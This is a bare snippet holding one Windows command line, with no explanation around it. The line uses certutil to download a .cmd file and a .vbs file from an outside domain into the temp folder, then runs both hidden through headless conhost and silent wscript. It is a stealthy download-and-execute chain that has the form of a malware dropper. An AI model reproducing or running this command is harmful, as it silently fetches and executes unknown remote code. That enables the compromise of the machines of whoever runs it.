Code

```cmd
C:\Windows\System32\conhost.exe cmd /c "certutil.exe -urlcache -split -f https://baa4ts.is-a-good.dev/v1/carpeta.cmd %TMP%\carpeta.cmd & conhost.exe --headless cmd /c %TMP%\carpeta.cmd & certutil.exe -urlcache -split -f https://baa4ts.is-a-good.dev/v2/remplazador.vbs %TMP%\remplazador.vbs & conhost.exe --headless cmd /c %SystemRoot%\System32\wscript.exe //B %TMP%\remplazador.vbs"
```
